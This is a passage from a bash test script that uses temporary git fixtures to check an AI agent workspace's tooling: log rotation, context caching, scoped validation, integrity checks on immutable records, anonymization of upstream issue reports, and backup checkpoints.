  fail 'append-knowledge-log.sh failed at the 1,000-record threshold'
elif [[ ! -f "$log_fixture_dir/knowledge/wiki/logs/2026-Q3.md" ]]; then
  fail 'append-knowledge-log.sh did not create the expected quarterly archive'
elif [[ "$(grep -Ec '^[0-9]{4}-[0-9]{2}-[0-9]{2}[[:space:]]+' "$log_fixture_dir/$knowledge_log_path" || true)" != '0' ]]; then
  fail 'append-knowledge-log.sh did not reset the current log after rotation'
elif [[ "$(grep -Ec '^[0-9]{4}-[0-9]{2}-[0-9]{2}[[:space:]]+' "$log_fixture_dir/knowledge/wiki/logs/2026-Q3.md" || true)" != '1000' ]]; then
  fail 'append-knowledge-log.sh archive does not contain exactly 1,000 records'
fi
mkdir -p "$log_fixture_dir/nested/.tmp"
printf 'ignore me\n' > "$log_fixture_dir/nested/.tmp/ignored.txt"
printf 'keep me\n' > "$log_fixture_dir/nested/kept.txt"
if ! AGENT_DIRECTORY_ROOT="$log_fixture_dir" AGENT_CACHE_DIR="$fixture_cache_dir" \
  bash "$repo_root/tools/build-context-cache.sh" >/dev/null; then
  fail 'build-context-cache.sh failed on nested .tmp fixture'
elif grep -Fq 'nested/.tmp/' "$fixture_cache_dir/manifest.tsv"; then
  fail 'build-context-cache.sh manifest includes a nested .tmp file'
elif ! grep -Fq $'nested/kept.txt\t' "$fixture_cache_dir/manifest.tsv"; then
  fail 'build-context-cache.sh nested .tmp test did not scan the adjacent durable file'
fi

# Routing and inventory are separate responsibilities: a routing-only rebuild refreshes
# the catalog without touching the manifest, and find-context.sh's stale recovery never
# produces a full workspace inventory.
mkdir -p "$log_fixture_dir/knowledge/wiki/topics"
printf -- '---\nsummary: routing rebuild probe\nstatus: active\naliases: []\n---\n\nrouting rebuild probe body\n' \
  > "$log_fixture_dir/knowledge/wiki/topics/routing-probe.md"
manifest_before_routing="$(cat "$fixture_cache_dir/manifest.tsv")"
if ! AGENT_DIRECTORY_ROOT="$log_fixture_dir" AGENT_CACHE_DIR="$fixture_cache_dir" \
  bash "$repo_root/tools/build-context-cache.sh" --routing-only >/dev/null; then
  fail 'build-context-cache.sh --routing-only failed'
else
  grep -Fq 'routing-probe' "$fixture_cache_dir/catalog.tsv" || \
    fail 'build-context-cache.sh --routing-only did not refresh the routing catalog'
  [[ "$manifest_before_routing" == "$(cat "$fixture_cache_dir/manifest.tsv")" ]] || \
    fail 'build-context-cache.sh --routing-only regenerated the workspace inventory (manifest)'
fi
routing_cache_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-routing.XXXXXX")"
cleanup_paths+=("$routing_cache_dir")
if ! AGENT_DIRECTORY_ROOT="$log_fixture_dir" AGENT_CACHE_DIR="$routing_cache_dir" \
  bash "$repo_root/tools/find-context.sh" --route knowledge --limit 5 -- 'routing rebuild probe' >/dev/null; then
  fail 'find-context.sh failed to recover from a missing cache'
else
  [[ -f "$routing_cache_dir/catalog.tsv" ]] || \
    fail 'find-context.sh stale recovery did not produce a routing catalog'
  [[ ! -f "$routing_cache_dir/manifest.tsv" ]] || \
    fail 'find-context.sh stale recovery generated a full workspace inventory (manifest)'
fi

# --changed scoped mode: a project-only change validates only that target, and a change
# reaching meta canon falls back to the full static run. The fixture root deliberately
# lacks the root canon, so a scoped run passes only if it truly skips the full scan.
changed_fixture_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-changed.XXXXXX")"
cleanup_paths+=("$changed_fixture_dir")
changed_env=(
  HOME="$changed_fixture_dir" GIT_CONFIG_NOSYSTEM=1
  GIT_AUTHOR_NAME=fixture GIT_AUTHOR_EMAIL=fixture@example.invalid
  GIT_COMMITTER_NAME=fixture GIT_COMMITTER_EMAIL=fixture@example.invalid
)
mkdir -p "$changed_fixture_dir/tools" "$changed_fixture_dir/projects/scoped-proj"
cp "$repo_root/tools/validate-agent-directory.sh" "$changed_fixture_dir/tools/"
{
  printf '%s\n' '---' 'name: scoped-proj' 'description: scoped validation fixture' \
    'status: active' 'mode: finite' '---' '' '> Scoped validation fixture goal.' '' \
    '## 目的' '## 判断原則' '## 非ゴール' '## 制約・固定決定' '## 品質基準' '## 入力' \
    '## 使用するKnowledge' '' '### Required' '' '### Conditional' '' \
    '## 使用するSkill' '' '### Required' '' '### Conditional' '' \
    '## 成果物' '## 検証方法' '## 最終ゴール' '## 完了条件' '' '- **PC-01** fixture criterion.'
} > "$changed_fixture_dir/projects/scoped-proj/PROJECT.md"
{
  printf '%s\n' '---' 'updated_at: 2026-08-06' '---' '' '## 現在の到達点' '## 現在の目標' '' \
    '対象契約: `PROJECT.md#PC-01`' '' '## 目標の合格条件' '## 検証結果' '' \
    '- 対象: `PROJECT.md#PC-01`' '' '## 未完了・ブロッカー' '## 現在有効な決定' \
    '## 失敗・却下済み' '## 次の一手'
} > "$changed_fixture_dir/projects/scoped-proj/STATE.md"
env "${changed_env[@]}" git -C "$changed_fixture_dir" init -q
env "${changed_env[@]}" git -C "$changed_fixture_dir" add -A
env "${changed_env[@]}" git -C "$changed_fixture_dir" commit -q -m 'fixture: scoped baseline'
printf '%s\n' '' '<!-- scoped fixture edit -->' >> "$changed_fixture_dir/projects/scoped-proj/STATE.md"
set +e
changed_output="$(env "${changed_env[@]}" bash "$changed_fixture_dir/tools/validate-agent-directory.sh" --changed 2>&1)"
changed_status=$?
set -e
if (( changed_status != 0 )) || ! printf '%s\n' "$changed_output" | grep -Fq 'scoped validation (--changed)'; then
  fail "validator --changed did not run a scoped pass on a project-only change: $(printf '%s' "$changed_output" | head -n 3 | tr '\n' ' ')"
fi

# --changed immutability boundary: with no explicit --base, the uncommitted work is
# judged against HEAD, so edits/deletions of immutable source material and closed
# logs are refused while plain additions pass, and a deleted wiki page never slips
# through as normal work.
changed_run() {
  set +e
  changed_output="$(env "${changed_env[@]}" bash "$changed_fixture_dir/tools/validate-agent-directory.sh" --changed 2>&1)"
  changed_status=$?
  set -e
}
mkdir -p "$changed_fixture_dir/knowledge/raw/internal" \
  "$changed_fixture_dir/knowledge/wiki/topics" "$changed_fixture_dir/knowledge/wiki/logs"
printf 'immutable record\n' > "$changed_fixture_dir/knowledge/raw/internal/record.txt"
printf -- '---\nsummary: scoped page\nstatus: active\naliases: []\n---\n\nscoped page body\n' \
  > "$changed_fixture_dir/knowledge/wiki/topics/scoped-page.md"
printf '# 2026-Q1 closed log\n' > "$changed_fixture_dir/knowledge/wiki/logs/2026-Q1.md"
env "${changed_env[@]}" git -C "$changed_fixture_dir" add -A
env "${changed_env[@]}" git -C "$changed_fixture_dir" commit -q -m 'fixture: knowledge baseline'

printf 'tamper\n' >> "$changed_fixture_dir/knowledge/raw/internal/record.txt"
changed_run
if (( changed_status == 0 )) || ! printf '%s\n' "$changed_output" | grep -Fq 'immutable source changed'; then
  fail 'validator --changed accepted an edit of immutable source material without --base'
fi
env "${changed_env[@]}" git -C "$changed_fixture_dir" checkout -q -- knowledge/raw/internal/record.txt

printf 'new record\n' > "$changed_fixture_dir/knowledge/raw/internal/new-record.txt"
env "${changed_env[@]}" git -C "$changed_fixture_dir" add knowledge/raw/internal/new-record.txt
changed_run
if (( changed_status != 0 )); then
  fail "validator --changed refused a plain addition of immutable source material: $(printf '%s' "$changed_output" | head -n 2 | tr '\n' ' ')"
fi
env "${changed_env[@]}" git -C "$changed_fixture_dir" reset -q HEAD -- knowledge/raw/internal/new-record.txt
rm -f "$changed_fixture_dir/knowledge/raw/internal/new-record.txt"

printf 'tamper\n' >> "$changed_fixture_dir/knowledge/wiki/logs/2026-Q1.md"
changed_run
if (( changed_status == 0 )) || ! printf '%s\n' "$changed_output" | grep -Fq 'closed Knowledge log changed'; then
  fail 'validator --changed accepted an edit of a closed Knowledge log without --base'
fi
env "${changed_env[@]}" git -C "$changed_fixture_dir" checkout -q -- knowledge/wiki/logs/2026-Q1.md

rm -f "$changed_fixture_dir/knowledge/wiki/topics/scoped-page.md"
changed_run
if (( changed_status == 0 )) || ! printf '%s\n' "$changed_output" | grep -Fq 'deletion contract'; then
  fail 'validator --changed silently passed a deleted Knowledge page'
fi
env "${changed_env[@]}" git -C "$changed_fixture_dir" checkout -q -- knowledge/wiki/topics/scoped-page.md

printf '# scoped fixture meta edit\n' >> "$changed_fixture_dir/tools/validate-agent-directory.sh"
set +e
changed_output="$(env "${changed_env[@]}" bash "$changed_fixture_dir/tools/validate-agent-directory.sh" --changed 2>&1)"
changed_status=$?
set -e
if (( changed_status == 0 )) || \
  ! printf '%s\n' "$changed_output" | grep -Fq 'running the full static validation'; then
  fail 'validator --changed did not fall back to the full static run when the changed set reached meta canon'
fi

# prepare-context.sh maps the agent-decided class deterministically: --class is
# mandatory (never an implicit work), and meta read maps to no validation and no backup.
set +e
prepare_probe_output="$(bash "$repo_root/tools/prepare-context.sh" --route meta --target tools/TOOLS.md 2>/dev/null)"
prepare_probe_status=$?
set -e
if (( prepare_probe_status != 2 )); then
  fail 'prepare-context.sh must reject a missing --class instead of assuming an implicit work'
fi
set +e
prepare_probe_output="$(bash "$repo_root/tools/prepare-context.sh" --route meta --target tools/TOOLS.md --class read 2>/dev/null)"
prepare_probe_status=$?
set -e
if (( prepare_probe_status != 0 )) || \
  ! printf '%s\n' "$prepare_probe_output" | grep -Fqx 'validation_profile=none' || \
  ! printf '%s\n' "$prepare_probe_output" | grep -Fqx 'backup_profile=none'; then
  fail 'prepare-context.sh --class read must map meta read to validation none and backup none'
fi

# finalize-task.sh is the deterministic work/state terminal: read has nothing to finalize,
# boundary stays on the manual CONTROL.md path, and a call arriving with an escalation ack
# preset is refused before any Git state is touched (each probe exits pre-side-effect).
set +e
finalize_probe_output="$(bash "$repo_root/tools/finalize-task.sh" --route knowledge --class read --message probe 2>/dev/null)"
finalize_probe_status=$?
set -e
if (( finalize_probe_status == 0 )) || \
  ! printf '%s\n' "$finalize_probe_output" | grep -Fq 'FINALIZE_BLOCKED reason=usage'; then
  fail 'finalize-task.sh must reject class read (nothing to finalize)'
fi
set +e
finalize_probe_output="$(bash "$repo_root/tools/finalize-task.sh" --route meta --class boundary --message probe 2>/dev/null)"
finalize_probe_status=$?
set -e
if (( finalize_probe_status == 0 )) || \
  ! printf '%s\n' "$finalize_probe_output" | grep -Fq 'FINALIZE_BLOCKED reason=boundary-class'; then
  fail 'finalize-task.sh must send class boundary to the manual CONTROL.md path'
fi
set +e
finalize_probe_output="$(AGENT_GUARDED_COMMIT=true bash "$repo_root/tools/finalize-task.sh" --route knowledge --class work --message probe 2>/dev/null)"
finalize_probe_status=$?
set -e
if (( finalize_probe_status == 0 )) || \
  ! printf '%s\n' "$finalize_probe_output" | grep -Fq 'FINALIZE_BLOCKED reason=ack-env-set'; then
  fail 'finalize-task.sh must refuse a call arriving with an escalation ack preset'
fi

# report-upstream-issue.sh anonymization derives block terms from the identity line of
# AGENTS.md#自己定義 (any heading depth) and is fail-closed on the number of checks that
# actually ran, not on the number of extracted tokens. The probes loop over every declared
# name (any sort position), any length and writing system, independent of the caller locale,
# and cover the --search mode. The probes stay on --dry-run, which never writes to the network.
upstream_fixture_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-upstream.XXXXXX")"
upstream_fixture_cache_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-upstream-cache.XXXXXX")"
cleanup_paths+=("$upstream_fixture_dir" "$upstream_fixture_cache_dir")
{
  printf '%s\n' '# AGENTS.md — fixture' '' '## 自己定義' '' \
    '- あなたは検査fixtureに特化した実行主体、`fixture-probe-agent`（`Fixture合同会社`／`Fixture Probe LLC`）。' \
    '- **運用者応対言語:** `English`。' \
    '- `<...>`は導入時に置換する。' '' \
    '## 共通判断原則'
} > "$upstream_fixture_dir/AGENTS.md"
printf 'privateなdownstream Workspaceの通常作業中に観測した。\n' > "$upstream_fixture_dir/body-clean.md"
printf 'The bootloader is written in English.\n' > "$upstream_fixture_dir/body-language.md"
upstream_probe() {
  set +e
  upstream_probe_output="$(AGENT_DIRECTORY_ROOT="$upstream_fixture_dir" \
    AGENT_CACHE_DIR="$upstream_fixture_cache_dir" \
    bash "$repo_root/tools/report-upstream-issue.sh" \
    --title '[bug] fixture probe' --body-file "$1" --dry-run 2>&1)"
  upstream_probe_status=$?
  set -e
}
# Every declared name must block, whatever its position in the sorted extraction (first,
# middle, and last are all probed so no single-name regression can pass unnoticed).
for upstream_probe_name in 'Fixture Probe LLC' 'Fixture合同会社' 'fixture-probe-agent'; do
  printf '%s の運用で観測した。\n' "$upstream_probe_name" > "$upstream_fixture_dir/body-name.md"
  upstream_probe "$upstream_fixture_dir/body-name.md"
  if (( upstream_probe_status == 0 )) || \
    ! printf '%s\n' "$upstream_probe_output" | grep -Fq 'violated-rule: agent-name'; then
    fail 'report-upstream-issue.sh must check every declared self-definition name, whatever its sort position'
  fi
done
upstream_probe "$upstream_fixture_dir/body-clean.md"
if (( upstream_probe_status != 0 )); then
  fail "report-upstream-issue.sh dry-run failed on an anonymized body: $(printf '%s' "$upstream_probe_output" | head -n 2 | tr '\n' ' ')"
fi
# The operator interaction language is a contract value, not a proper noun: a body naming
# the language must pass even though the language sits backticked in the self-definition.
upstream_probe "$upstream_fixture_dir/body-language.md"
if (( upstream_probe_status != 0 )); then
  fail 'report-upstream-issue.sh must not treat the operator interaction language as an agent name'
fi
# A short CJK name is still a declared proper noun: no length guard, no locale dependence.
{
  printf '%s\n' '# AGENTS.md — fixture' '' '## 自己定義' '' \
    '- あなたは`甲乙丙`（役割:`検査fixture`）。' '' '## 共通判断原則'
} > "$upstream_fixture_dir/AGENTS.md"
printf '甲乙丙 のworkspaceで観測した。\n' > "$upstream_fixture_dir/body-short-name.md"
set +e
upstream_probe_output="$(LANG=ja_JP.UTF-8 LC_ALL='' AGENT_DIRECTORY_ROOT="$upstream_fixture_dir" \
  AGENT_CACHE_DIR="$upstream_fixture_cache_dir" \
  bash "$repo_root/tools/report-upstream-issue.sh" \
  --title '[bug] fixture probe' --body-file "$upstream_fixture_dir/body-short-name.md" --dry-run 2>&1)"
upstream_probe_status=$?
set -e
if (( upstream_probe_status == 0 )) || \
  ! printf '%s\n' "$upstream_probe_output" | grep -Fq 'violated-rule: agent-name'; then
  fail 'report-upstream-issue.sh must block a 3-character declared name under a UTF-8 locale'
fi
# The section is found by heading text, not by heading depth.
{
  printf '%s\n' '# AGENTS.md — fixture' '' '## Agent' '' '### 自己定義' '' \
    '- あなたは`fixture-probe-agent`（役割:`検査fixture`）。' '' '## 共通判断原則'
} > "$upstream_fixture_dir/AGENTS.md"
printf 'fixture-probe-agent のworkspaceで観測した。\n' > "$upstream_fixture_dir/body-name.md"
upstream_probe "$upstream_fixture_dir/body-name.md"
if (( upstream_probe_status == 0 )) || \
  ! printf '%s\n' "$upstream_probe_output" | grep -Fq 'violated-rule: agent-name'; then
  fail 'report-upstream-issue.sh must find the self-definition section at any heading depth'
fi
# Fail-closed distinctions: no backticked name on the identity line, placeholders only,
# and a missing section each block instead of silently skipping the agent-name rule.
{
  printf '%s\n' '# AGENTS.md — fixture' '' '## 自己定義' '' \
    '- あなたは名を名乗らない散文だけの実行主体。' '' '## 共通判断原則'
} > "$upstream_fixture_dir/AGENTS.md"
upstream_probe "$upstream_fixture_dir/body-clean.md"
if (( upstream_probe_status == 0 )) || \
  ! printf '%s\n' "$upstream_probe_output" | grep -Fq 'reason=anonymization-source-unparsed'; then
  fail 'report-upstream-issue.sh must fail closed when no backticked name is extractable from AGENTS.md#自己定義'
fi
{
  printf '%s\n' '# AGENTS.md — fixture' '' '## 自己定義' '' \
    '- あなたは`<agent-name>`（役割:`<agent-role>`）。' \
    '- `<...>`は導入時に置換する。' '' '## 共通判断原則'
} > "$upstream_fixture_dir/AGENTS.md"
upstream_probe "$upstream_fixture_dir/body-clean.md"
if (( upstream_probe_status == 0 )) || \
  ! printf '%s\n' "$upstream_probe_output" | grep -Fq 'reason=anonymization-source-unparsed'; then
  fail 'report-upstream-issue.sh must fail closed when every identity-line token is a template placeholder'
fi
{
  printf '%s\n' '# AGENTS.md — fixture' '' '## 挨拶' '' '- 自己定義の見出しを持たない。'
} > "$upstream_fixture_dir/AGENTS.md"
upstream_probe "$upstream_fixture_dir/body-clean.md"
if (( upstream_probe_status == 0 )) || \
  ! printf '%s\n' "$upstream_probe_output" | grep -Fq 'reason=anonymization-source-unparsed'; then
  fail 'report-upstream-issue.sh must fail closed when AGENTS.md has no 自己定義 section'
fi
# --search goes through the same anonymization inspection and honors --dry-run.
{
  printf '%s\n' '# AGENTS.md — fixture' '' '## 自己定義' '' \
    '- あなたは`fixture-probe-agent`（役割:`検査fixture`）。' '' '## 共通判断原則'
} > "$upstream_fixture_dir/AGENTS.md"
set +e
upstream_probe_output="$(AGENT_DIRECTORY_ROOT="$upstream_fixture_dir" \
  AGENT_CACHE_DIR="$upstream_fixture_cache_dir" \
  bash "$repo_root/tools/report-upstream-issue.sh" \
  --search 'fixture-probe-agent bootloader' --dry-run 2>&1)"
upstream_probe_status=$?
set -e
if (( upstream_probe_status == 0 )) || \
  ! printf '%s\n' "$upstream_probe_output" | grep -Fq 'violated-rule: agent-name'; then
  fail 'report-upstream-issue.sh must run the anonymization inspection on --search terms'
fi
set +e
upstream_probe_output="$(AGENT_DIRECTORY_ROOT="$upstream_fixture_dir" \
  AGENT_CACHE_DIR="$upstream_fixture_cache_dir" \
  bash "$repo_root/tools/report-upstream-issue.sh" \
  --search 'bootloader routing budget' --dry-run 2>&1)"
upstream_probe_status=$?
set -e
if (( upstream_probe_status != 0 )) || \
  ! printf '%s\n' "$upstream_probe_output" | grep -Fq 'UPSTREAM_REPORT_SEARCH_DRY_RUN_OK'; then
  fail 'report-upstream-issue.sh --search must support --dry-run for clean terms'
fi
{
  printf '%s\n' '# AGENTS.md — fixture' '' '## 自己定義' '' \
    '- あなたは`fixture-probe-agent`（役割:`検査fixture`）。' '' '## 共通判断原則'
} > "$upstream_fixture_dir/AGENTS.md"
env -i PATH="$PATH" HOME="$upstream_fixture_dir" GIT_CONFIG_NOSYSTEM=1 \
  git -C "$upstream_fixture_dir" init -q
env -i PATH="$PATH" HOME="$upstream_fixture_dir" GIT_CONFIG_NOSYSTEM=1 \
  git -C "$upstream_fixture_dir" config agent-directory.upstream-revision 0123456789abcdef0123456789abcdef01234567
upstream_probe "$upstream_fixture_dir/body-clean.md"
if (( upstream_probe_status != 0 )) || \
  ! printf '%s\n' "$upstream_probe_output" | grep -Fq 'resolved-from: declared'; then
  fail 'report-upstream-issue.sh must resolve the upstream revision from the declared adoption when merge-base cannot'
fi

# A canon file lacking frontmatter must not stop cache generation; warn naming the target and drop it from the candidates.
mkdir -p "$malformed_fixture_dir/projects/good-project" \
  "$malformed_fixture_dir/projects/no-status" \
  "$malformed_fixture_dir/skills/blank-status-skill" \
  "$malformed_fixture_dir/knowledge/wiki/topics"
{
  printf '%s\n' '---' 'name: good-project' 'description: fixture' 'status: active'
  printf '%s\n' 'mode: finite' '---'
} > "$malformed_fixture_dir/projects/good-project/PROJECT.md"
{
  printf '%s\n' '---' 'name: no-status' 'description: fixture' '---'
} > "$malformed_fixture_dir/projects/no-status/PROJECT.md"
{
  printf '%s\n' '---' 'name: blank-status-skill' 'description: fixture' 'status:' '---'
} > "$malformed_fixture_dir/skills/blank-status-skill/SKILL.md"
{
  printf '%s\n' '---' 'summary: fixture' 'aliases: []' '---'
} > "$malformed_fixture_dir/knowledge/wiki/topics/no-status.md"

set +e
malformed_output="$(AGENT_DIRECTORY_ROOT="$malformed_fixture_dir" AGENT_CACHE_DIR="$malformed_cache_dir" \
  bash "$repo_root/tools/build-context-cache.sh" 2>&1)"
malformed_status=$?
set -e
if (( malformed_status != 0 )); then
  fail "build-context-cache.sh aborted on a malformed canon file instead of warning and skipping: $malformed_output"
else
  for malformed_target in \
    'projects/no-status/PROJECT.md' \
    'skills/blank-status-skill/SKILL.md' \
    'knowledge/wiki/topics/no-status.md'; do
    printf '%s\n' "$malformed_output" | grep -Eq "^WARN: $malformed_target: missing .*status" || \
      fail "build-context-cache.sh did not name $malformed_target and its missing key in a WARN line"
    if [[ -f "$malformed_cache_dir/catalog.tsv" ]] && \
      grep -Fq "$malformed_target" "$malformed_cache_dir/catalog.tsv"; then
      fail "build-context-cache.sh registered the malformed canon file in the catalog: $malformed_target"
    fi
  done
  if printf '%s\n' "$malformed_output" | grep -Eq '^WARN: knowledge/wiki/topics/no-status\.md: missing name'; then
    fail 'build-context-cache.sh reported a missing name for a knowledge page whose name comes from the filename'
  fi
  if [[ ! -f "$malformed_cache_dir/catalog.tsv" ]] || \
    ! grep -Fq 'projects/good-project/PROJECT.md' "$malformed_cache_dir/catalog.tsv"; then
    fail 'build-context-cache.sh dropped a well-formed canon file while skipping malformed ones'
  fi
fi
if [[ -f "$cache_test_dir/catalog.tsv" ]]; then
  alias_collisions="$(awk -F '\t' '
    NR == 1 || $3 != "active" || ($1 != "knowledge" && $1 != "skill") { next }
    {
      owner = $8
      key = $1 SUBSEP tolower($4)
      if (seen[key] != "" && seen[key] != owner) print $1 ":" tolower($4)
      seen[key] = owner
      count = split(tolower($5), alias, "|")
      for (i = 1; i <= count; i++) {
        if (alias[i] == "") continue
        key = $1 SUBSEP alias[i]
        if (seen[key] != "" && seen[key] != owner) print $1 ":" alias[i]
        seen[key] = owner
      }
    }
  ' "$cache_test_dir/catalog.tsv" | LC_ALL=C sort -u)"
  [[ -z "$alias_collisions" ]] || fail "active alias collision(s): $alias_collisions"
fi

if [[ -f "$backup_tool" ]] && command -v git >/dev/null 2>&1; then
  backup_work="$backup_fixture_dir/work"
  backup_remote_dir="$backup_fixture_dir/remote.git"
  backup_peer="$backup_fixture_dir/peer"
  independent_seed="$backup_fixture_dir/independent-seed"
  independent_remote_dir="$backup_fixture_dir/independent.git"
  independent_clone="$backup_work/projects/data-pipeline"
  independent_cache_dir="$backup_fixture_dir/independent-cache"
  fixture_registry="$backup_work/projects/REPOSITORIES.md"
  fixture_ignore="$backup_work/projects/.gitignore"
  backup_env=(
    HOME="$backup_fixture_dir" GIT_CONFIG_NOSYSTEM=1
    GIT_AUTHOR_NAME=fixture GIT_AUTHOR_EMAIL=fixture@example.invalid
    GIT_COMMITTER_NAME=fixture GIT_COMMITTER_EMAIL=fixture@example.invalid
    AGENT_ALLOW_LOCAL_REPOSITORY_URL=true
  )
  backup_output=''
  backup_status=0

  backup_git() { env "${backup_env[@]}" git -C "$backup_work" "$@"; }
  child_git() { env "${backup_env[@]}" git -C "$independent_clone" "$@"; }
  seed_git() { env "${backup_env[@]}" git -C "$independent_seed" "$@"; }
  backup_run() {
    set +e
    backup_output="$(env "${backup_env[@]}" AGENT_DIRECTORY_ROOT="$backup_work" bash "$backup_tool" "$@" 2>&1)"
    backup_status=$?
    set -e
  }
  materialize_run() {
    set +e
    backup_output="$(env "${backup_env[@]}" AGENT_DIRECTORY_ROOT="$backup_work" \
      bash "$materialize_tool" "$@" 2>&1)"
    backup_status=$?
    set -e
  }
  build_fixture_cache() {
    set +e
    env "${backup_env[@]}" AGENT_DIRECTORY_ROOT="$backup_work" AGENT_CACHE_DIR="$independent_cache_dir" \
      bash "$repo_root/tools/build-context-cache.sh" >/dev/null 2>&1
    backup_status=$?
    set -e
  }
  fixture_fingerprint() {
    sed -n 's/^content_fingerprint=//p' "$independent_cache_dir/cache.meta" | head -n 1
  }
  fixture_catalog_field() {
    awk -F '\t' -v path="$1" -v column="$2" '$8 == path { print $column; exit }' \
      "$independent_cache_dir/catalog.tsv"
  }
  backup_expect_blocked() {
    if (( backup_status == 0 )); then
      fail "backup fixture: $2 unexpectedly succeeded"
    elif ! printf '%s\n' "$backup_output" | grep -Fqx "BACKUP_BLOCKED reason=$1"; then
      fail "backup fixture: $2 did not report reason=$1: $(printf '%s' "$backup_output" | head -n 2 | tr '\n' ' ')"
    fi
  }
  backup_expect_line() {
    if (( backup_status != 0 )); then
      fail "backup fixture: $2 failed: $backup_output"
    elif ! printf '%s\n' "$backup_output" | grep -Fqx "$1"; then
      fail "backup fixture: $2 did not emit: $1"
    fi
  }
  materialize_expect_blocked() {
    if (( backup_status == 0 )); then
      fail "materializer fixture: $3 unexpectedly succeeded"
    elif ! printf '%s\n' "$backup_output" | grep -Fqx "MATERIALIZATION_BLOCKED reason=$1 project=$2"; then
      fail "materializer fixture: $3 did not report reason=$1: $(printf '%s' "$backup_output" | head -n 2 | tr '\n' ' ')"
    fi
  }
  materialize_expect_line() {
    if (( backup_status != 0 )); then
      fail "materializer fixture: $2 failed: $backup_output"
    elif ! printf '%s\n' "$backup_output" | grep -Fqx "$1"; then
      fail "materializer fixture: $2 did not emit: $1"
    fi
  }
  backup_remote_sha() {
    env "${backup_env[@]}" git -C "$backup_remote_dir" rev-parse --verify --quiet refs/heads/main || true
  }
  independent_remote_sha() {
    env "${backup_env[@]}" git -C "$independent_remote_dir" rev-parse --verify --quiet refs/heads/main || true
  }
  write_registry() {
    {
      printf '%s\n' '# REPOSITORIES — Independent Project Registry' ''
      printf '%s\n' 'Independent Projectのattachmentと復旧情報だけを持つ。' ''
      printf '%s\n' '## `data-pipeline`' ''
      printf -- '- repository_url: `%s`\n' "$independent_remote_dir"
      printf -- '- repository_reason: `%s`\n' "${2:-automation}"
      printf -- '- revision: `%s`\n' "$1"
    } > "$fixture_registry"
  }
  write_ignore_projection() {
    {
      printf '%s\n' '# Derived from projects/REPOSITORIES.md.' '# BEGIN INDEPENDENT PROJECTS'
      while (( $# > 0 )); do printf '/%s/\n' "$1"; shift; done
      printf '%s\n' '# END INDEPENDENT PROJECTS'
    } > "$fixture_ignore"
  }
  adopt_revision() {
    write_registry "$1"
    backup_git add projects/REPOSITORIES.md
    backup_git commit -q -m 'fixture: adopt revision'
  }

  env "${backup_env[@]}" git init -q --bare "$backup_remote_dir"
  env "${backup_env[@]}" git -C "$backup_remote_dir" symbolic-ref HEAD refs/heads/main
  env "${backup_env[@]}" git init -q --bare "$independent_remote_dir"
  env "${backup_env[@]}" git -C "$independent_remote_dir" symbolic-ref HEAD refs/heads/main
  # Allow fetch by SHA for the negative case adopting a commit unreachable from any branch or tag.
  env "${backup_env[@]}" git -C "$independent_remote_dir" config uploadpack.allowAnySHA1InWant true

  # The Independent Project's PROJECT.md and STATE.md are owned by the child Git.
  env "${backup_env[@]}" git init -q "$independent_seed"
  seed_git symbolic-ref HEAD refs/heads/main
  printf 'verified independent revision\n' > "$independent_seed/source.txt"
  {
    printf '%s\n' '---' 'name: data-pipeline' 'description: fixture contract owned by the child Git'
    printf '%s\n' 'status: active' 'mode: continuous' '---'
  } > "$independent_seed/PROJECT.md"
  {
    printf '%s\n' '---' 'updated_at: 2026-08-03' '---' '' '# Current State'
  } > "$independent_seed/STATE.md"
  seed_git add source.txt PROJECT.md STATE.md
  seed_git commit -q -m 'fixture: independent revision'
  seed_git remote add origin "$independent_remote_dir"
  seed_git push -q origin main
  independent_revision="$(seed_git rev-parse HEAD)"

  env "${backup_env[@]}" git init -q "$backup_work"
  backup_git symbolic-ref HEAD refs/heads/main
  mkdir -p "$backup_work/tools" "$backup_work/projects"
  printf 'fixture agent directory\n' > "$backup_work/AGENTS.md"
  printf '.tmp/\n.agent-cache/\n.env*\n!.env.example\n.DS_Store\nignored-dir/\n' \
    > "$backup_work/.gitignore"
  printf '#!/usr/bin/env bash\nexit 0\n' > "$backup_work/tools/validate-agent-directory.sh"
  # An Embedded Project is tracked wholesale by the root Git and never enters the ignore projection.
  mkdir -p "$backup_work/projects/embedded-project"
  {
    printf '%s\n' '---' 'name: embedded-project' 'description: fixture embedded project'
    printf '%s\n' 'status: active' 'mode: finite' '---'
  } > "$backup_work/projects/embedded-project/PROJECT.md"
  {
    printf '%s\n' '---' 'updated_at: 2026-08-03' '---' '' '# Current State'
  } > "$backup_work/projects/embedded-project/STATE.md"
  # First confirm everything holds even with an empty registry.
  printf '%s\n' '# REPOSITORIES — Independent Project Registry' > "$fixture_registry"
  write_ignore_projection
  backup_git add -A
  backup_git commit -q -m 'fixture: empty registry'
  backup_git remote add backup "$backup_remote_dir"
  backup_run --root-only --dry-run
  backup_expect_line \
    "ROOT_BACKUP_READY remote=backup branch=main sha=$(backup_git rev-parse HEAD) scope=root-only" \
    'root-only dry run on an empty registry'
  materialize_run --all
  materialize_expect_line 'MATERIALIZATION_OK total=0 cloned=0 verified=0' 'an empty registry'

  # Checkpoint and incremental object audit: a verified backup records the remote-confirmed
  # SHA, the next success audits only the new range, and a missing or corrupt checkpoint
  # falls back to the full-history scan without weakening the oversized-object stop.
  backup_run --root-only
  backup_expect_line "ROOT_BACKUP_OK remote=backup branch=main sha=$(backup_git rev-parse HEAD) scope=root-only" \
    'initial root-only backup'
  backup_checkpoint_file="$backup_work/.agent-cache/backup-checkpoint-backup-main"
  [[ -f "$backup_checkpoint_file" ]] || \
    fail 'backup fixture: no checkpoint was recorded after a remote-verified backup'
  grep -Fqx "sha=$(backup_git rev-parse HEAD)" "$backup_checkpoint_file" || \
    fail 'backup fixture: the checkpoint does not record the remote-verified SHA'
  if grep -Eq '^url=' "$backup_checkpoint_file" || \
    grep -Fq "$backup_remote_dir" "$backup_checkpoint_file"; then
    fail 'backup fixture: the checkpoint stores the remote URL in the clear instead of a hash'
  fi
  grep -Eq '^url_hash=' "$backup_checkpoint_file" || \
    fail 'backup fixture: the checkpoint does not record a deterministic URL hash'
  printf '%02048d' 0 > "$backup_work/pre-checkpoint-blob.txt"
  backup_git add pre-checkpoint-blob.txt
  backup_git commit -q -m 'fixture: blob below the default limit'
  backup_run --root-only
  backup_expect_line "ROOT_BACKUP_OK remote=backup branch=main sha=$(backup_git rev-parse HEAD) scope=root-only" \
    'incremental root-only backup'
  printf '%s\n' "$backup_output" | grep -Fq 'incremental object audit' || \
